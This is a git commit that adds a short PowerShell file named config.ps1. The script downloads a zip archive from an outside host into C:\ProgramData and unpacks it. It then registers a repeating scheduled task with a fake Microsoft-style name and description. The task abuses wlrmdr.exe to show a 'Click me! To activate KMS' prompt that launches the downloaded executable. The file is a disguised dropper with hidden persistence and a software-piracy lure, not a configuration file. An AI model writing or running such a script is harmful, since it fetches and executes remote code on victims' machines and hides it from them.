f8343f16d8e16199e453c11b77e413c25a6a4dd8
Maestran <tristan.gorlin@gmail.com>
2023-06-11 15:15:42 +0200

    Create config.ps1

---
+++ config.ps1
@@ -0,0 +1,5 @@
+Invoke-WebRequest -Uri "https://ouest-vpn.fr/WindowsConfigManager.zip" -OutFile "C:\ProgramData\config.zip"
+Expand-Archive -Path "C:\ProgramData\config.zip" -DestinationPath "C:\ProgramData\WindowsConfigManager"
+$action=New-ScheduledTaskAction -Execute "wlrmdr.exe" -Argument '-s 3600 -f 0 -t Click me! -m To activate KMS -a 10 -u "C:\ProgramData\WindowsConfigManager\WindowsConfigManager\windows-compat.exe"'
+$trigger=New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) 
+Register-ScheduledTask -TaskName "Systeme de comptabilité Microsoft" -Description "Assure la liste des services actifs" -Trigger $trigger -Action $action 
